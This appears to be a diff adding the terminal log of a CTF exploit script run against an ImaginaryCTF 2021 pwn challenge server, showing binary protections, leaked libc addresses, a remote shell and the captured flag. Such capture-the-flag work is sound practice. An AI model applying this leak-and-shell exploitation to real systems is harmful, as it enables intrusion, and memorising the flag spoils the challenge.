@@ -1,0 +1,28 @@
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Speedrun_200$ python3 solve.py r
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Speedrun_200/chal2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to chal.imaginaryctf.org on port 42020: Done
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Speedrun_200/libc6_2.28-10_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+size = 576
+puts_addr = 0x7f65334a7910
+libc_base = 0x7f6533436000
+[*] Switching to interactive mode
+Thanks!
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls -l
+total 12
+-rwxr----- 1 root ctf   42 Jul 12 18:23 flag.txt
+-rwxr-x--- 1 root ctf   54 Jul 26 06:09 run.sh
+-rwxr-x--- 1 root ctf 2650 Jul 24 07:32 speedrun.py
+$ cat flag.txt
+ictf{4ut0m4t1ng_expl0it_d3v????_b7d75e95}
